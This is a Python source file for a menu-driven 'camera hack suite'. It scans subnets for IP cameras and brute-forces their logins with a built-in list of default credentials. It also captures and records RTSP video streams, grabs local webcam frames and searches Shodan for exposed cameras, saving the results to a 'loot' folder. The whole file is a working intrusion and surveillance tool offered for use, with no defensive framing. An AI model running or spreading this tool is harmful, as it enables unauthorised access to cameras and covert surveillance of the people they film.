#!/usr/bin/env python3
import os, sys, subprocess, shutil, socket, threading, time

RED="\033[91m"; YEL="\033[93m"; CYN="\033[96m"; GRN="\033[92m"
WHT="\033[97m"; DIM="\033[2m";  RST="\033[0m"

LOGO = f"""{RED}
   ██████╗ █████╗ ███╗   ███╗███████╗██████╗  █████╗
  ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗
  ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████║
  ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║
  ╚██████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝{RST}
{DIM}                    [ camera hack suite ]{RST}
"""

MENU = f"""
{YEL}┌──────────────────────────────────────────────────────┐
│                {WHT}CAMERA HACK OPTIONS{YEL}                 │
├──────────────────────────────────────────────────────┤
│  {CYN}[1]{YEL}  Scan network for IP cameras (RTSP/HTTP)      │
│  {CYN}[2]{YEL}  Bruteforce camera credentials               │
│  {CYN}[3]{YEL}  Capture RTSP stream snapshot                 │
│  {CYN}[4]{YEL}  Dump RTSP stream to file (record)            │
│  {CYN}[5]{YEL}  Local webcam capture (OpenCV)                │
│  {CYN}[6]{YEL}  Shodan camera search (requires API key)      │
│  {CYN}[7]{YEL}  Default credentials list                     │
│  {CYN}[0]{YEL}  Back                                         │
└──────────────────────────────────────────────────────┘{RST}
"""

DEFAULT_CREDS = [
    ("admin","admin"),("admin",""),("admin","12345"),("admin","password"),
    ("admin","1234"),("admin","admin123"),("root","root"),("root",""),
    ("root","12345"),("user","user"),("guest","guest"),("admin","888888"),
    ("admin","666666"),("supervisor","supervisor"),("service","service"),
    ("ubnt","ubnt"),("ftp","ftp"),("admin","pass"),("admin","1111"),
]

RTSP_PATHS = [
    "/","/{user}_{pass}","/live","/live/ch0","/live/main",
    "/h264/ch1/main/av_stream","/cam/realmonitor?channel=1&subtype=0",
    "/streaming/channels/1","/video1","/axis-media/media.amp",
    "/mpeg4/media.amp","/img/media.sav","/mjpeg/video.mjpeg",
]

def clear(): os.system("clear")
def sh(cmd): return os.popen(cmd).read().strip()
os.makedirs("loot/camera", exist_ok=True)

# ── 1. network scan ───────────────────────────────────────────────────────────
def _check_rtsp(ip, port=554, timeout=1):
    try:
        s=socket.socket(); s.settimeout(timeout)
        r=s.connect_ex((ip,port)); s.close()
        return r==0
    except: return False

def _check_http_cam(ip, port=80, timeout=1):
    try:
        s=socket.socket(); s.settimeout(timeout)
        s.connect((ip,port))
        s.send(b"GET / HTTP/1.0\r\n\r\n")
        d=s.recv(512).decode(errors="replace"); s.close()
        keys=["camera","webcam","ipcam","nvr","dvr","dahua","hikvision","axis","rtsp"]
        return any(k in d.lower() for k in keys)
    except: return False

def scan_cameras():
    print(f"\n{CYN}[ CAMERA NETWORK SCAN ]{RST}")
    subnet=input("  subnet (e.g. 192.168.1): ").strip()
    ports_in=input("  ports [80,554,8080,8554]: ").strip() or "80,554,8080,8554"
    ports=[int(p) for p in ports_in.split(",")]
    found=[]
    lock=threading.Lock()

    def check(ip):
        for p in ports:
            if p==554:
                if _check_rtsp(ip,p):
                    with lock: found.append((ip,p,"RTSP")); print(f"  {GRN}[+] RTSP  {ip}:{p}{RST}")
            else:
                if _check_http_cam(ip,p):
                    with lock: found.append((ip,p,"HTTP-CAM")); print(f"  {GRN}[+] HTTP  {ip}:{p}{RST}")

    threads=[]
    for i in range(1,255):
        ip=f"{subnet}.{i}"
        t=threading.Thread(target=check,args=(ip,),daemon=True); t.start(); threads.append(t)
    for t in threads: t.join()
    print(f"\n{GRN}[+] found {len(found)} cameras{RST}")
    if found:
        with open("loot/camera/scan.txt","w") as f:
            for ip,p,proto in found: f.write(f"{proto} {ip}:{p}\n")
        print(f"{DIM}  saved to loot/camera/scan.txt{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── 2. credential bruteforce ──────────────────────────────────────────────────
def bruteforce():
    print(f"\n{CYN}[ CAMERA CREDENTIAL BRUTEFORCE ]{RST}")
    ip  =input("  target IP: ").strip()
    port=input("  port [80]: ").strip() or "80"
    print(f"\n  trying {len(DEFAULT_CREDS)} credential pairs...\n")
    for user,pwd in DEFAULT_CREDS:
        try:
            import urllib.request, base64
            url=f"http://{ip}:{port}/"
            req=urllib.request.Request(url)
            cred=base64.b64encode(f"{user}:{pwd}".encode()).decode()
            req.add_header("Authorization",f"Basic {cred}")
            resp=urllib.request.urlopen(req,timeout=3)
            if resp.status < 400:
                print(f"  {GRN}[+] SUCCESS  {user}:{pwd}{RST}")
                with open("loot/camera/creds.txt","a") as f:
                    f.write(f"{ip}:{port} {user}:{pwd}\n")
                break
            else:
                print(f"  {DIM}[-] {user}:{pwd}{RST}")
        except Exception as e:
            print(f"  {DIM}[-] {user}:{pwd} ({type(e).__name__}){RST}")
    input(f"\n{DIM}press enter{RST}")

# ── 3. RTSP snapshot ──────────────────────────────────────────────────────────
def rtsp_snapshot():
    print(f"\n{CYN}[ RTSP SNAPSHOT ]{RST}")
    if not shutil.which("ffmpeg"): print(f"{RED}[!] ffmpeg required{RST}"); input(); return
    ip  =input("  camera IP: ").strip()
    port=input("  RTSP port [554]: ").strip() or "554"
    user=input("  username (blank=none): ").strip()
    pwd =input("  password (blank=none): ").strip()
    path=input(f"  stream path [/]: ").strip() or "/"
    auth=f"{user}:{pwd}@" if user else ""
    url =f"rtsp://{auth}{ip}:{port}{path}"
    ts  =int(time.time())
    out =f"loot/camera/{ip.replace('.','_')}_{ts}.jpg"
    cmd =["ffmpeg","-y","-i",url,"-vframes","1","-q:v","2",out]
    print(f"\n{DIM}  {' '.join(cmd)}{RST}\n")
    r=subprocess.run(cmd, capture_output=True, timeout=15)
    if os.path.exists(out) and os.path.getsize(out)>0:
        print(f"{GRN}[+] snapshot saved: {out}{RST}")
    else:
        print(f"{RED}[!] failed — wrong path or creds{RST}")
        print(f"{DIM}  trying common paths...{RST}")
        for p in RTSP_PATHS[:5]:
            url2=f"rtsp://{auth}{ip}:{port}{p}"
            r2=subprocess.run(["ffmpeg","-y","-i",url2,"-vframes","1","-q:v","2",out],
                              capture_output=True, timeout=8)
            if os.path.exists(out) and os.path.getsize(out)>0:
                print(f"{GRN}[+] found stream at {p} — saved {out}{RST}"); break
    input(f"\n{DIM}press enter{RST}")

# ── 4. RTSP record ────────────────────────────────────────────────────────────
def rtsp_record():
    print(f"\n{CYN}[ RTSP RECORD ]{RST}")
    if not shutil.which("ffmpeg"): print(f"{RED}[!] ffmpeg required{RST}"); input(); return
    ip  =input("  camera IP: ").strip()
    port=input("  port [554]: ").strip() or "554"
    user=input("  username: ").strip()
    pwd =input("  password: ").strip()
    path=input("  stream path [/]: ").strip() or "/"
    dur =input("  record seconds [30]: ").strip() or "30"
    auth=f"{user}:{pwd}@" if user else ""
    url =f"rtsp://{auth}{ip}:{port}{path}"
    ts  =int(time.time())
    out =f"loot/camera/{ip.replace('.','_')}_{ts}.mp4"
    cmd =["ffmpeg","-y","-i",url,"-t",dur,"-c","copy",out]
    print(f"\n{DIM}  {' '.join(cmd)}{RST}\n")
    try: subprocess.run(cmd, timeout=int(dur)+10)
    except subprocess.TimeoutExpired: pass
    if os.path.exists(out): print(f"{GRN}[+] recorded: {out}{RST}")
    else: print(f"{RED}[!] failed{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── 5. local webcam ───────────────────────────────────────────────────────────
def local_webcam():
    print(f"\n{CYN}[ LOCAL WEBCAM CAPTURE ]{RST}")
    try:
        import cv2
        idx=int(input("  camera index [0]: ").strip() or "0")
        count=int(input("  frames to capture [1]: ").strip() or "1")
        cap=cv2.VideoCapture(idx)
        if not cap.isOpened(): print(f"{RED}[!] cannot open camera {idx}{RST}"); input(); return
        saved=[]
        for i in range(count):
            ret,frame=cap.read()
            if ret:
                ts=int(time.time())
                out=f"loot/camera/webcam_{ts}_{i}.jpg"
                cv2.imwrite(out,frame); saved.append(out)
                time.sleep(0.5)
        cap.release()
        print(f"{GRN}[+] saved: {saved}{RST}")
    except ImportError:
        print(f"{RED}[!] opencv-python not installed — pip3 install opencv-python{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── 6. Shodan search ──────────────────────────────────────────────────────────
def shodan_search():
    print(f"\n{CYN}[ SHODAN CAMERA SEARCH ]{RST}")
    try:
        import shodan
    except ImportError:
        print(f"{RED}[!] shodan not installed — pip3 install shodan{RST}"); input(); return
    key=input("  Shodan API key: ").strip()
    query=input("  query [webcamxp product:camera]: ").strip() or "webcamxp product:camera"
    limit=int(input("  max results [20]: ").strip() or "20")
    api=shodan.Shodan(key)
    try:
        results=api.search(query,limit=limit)
        print(f"\n{GRN}[+] {results['total']} results{RST}\n")
        with open("loot/camera/shodan.txt","w") as f:
            for r in results['matches']:
                ip=r['ip_str']; port=r.get('port',80)
                org=r.get('org','?'); country=r.get('location',{}).get('country_name','?')
                line=f"{ip}:{port}  {org}  {country}"
                print(f"  {line}")
                f.write(line+"\n")
        print(f"\n{DIM}  saved to loot/camera/shodan.txt{RST}")
    except Exception as e:
        print(f"{RED}[!] {e}{RST}")
    input(f"\n{DIM}press enter{RST}")

# ── 7. default creds list ─────────────────────────────────────────────────────
def show_creds():
    print(f"\n{CYN}[ DEFAULT CAMERA CREDENTIALS ]{RST}\n")
    print(f"  {'USERNAME':<20} PASSWORD")
    print(f"  {'-'*35}")
    for u,p in DEFAULT_CREDS:
        print(f"  {u:<20} {p or '(blank)'}")
    input(f"\n{DIM}press enter{RST}")

ACTIONS={"1":scan_cameras,"2":bruteforce,"3":rtsp_snapshot,"4":rtsp_record,"5":local_webcam,"6":shodan_search,"7":show_creds}

def main():
    while True:
        clear(); print(LOGO); print(MENU)
        c=input(f"{RED}camera{RST} {YEL}>{RST} ").strip()
        if c=="0": break
        if c in ACTIONS: ACTIONS[c]()
        else: input(f"{YEL}[?] invalid — enter{RST}")

if __name__=="__main__": main()
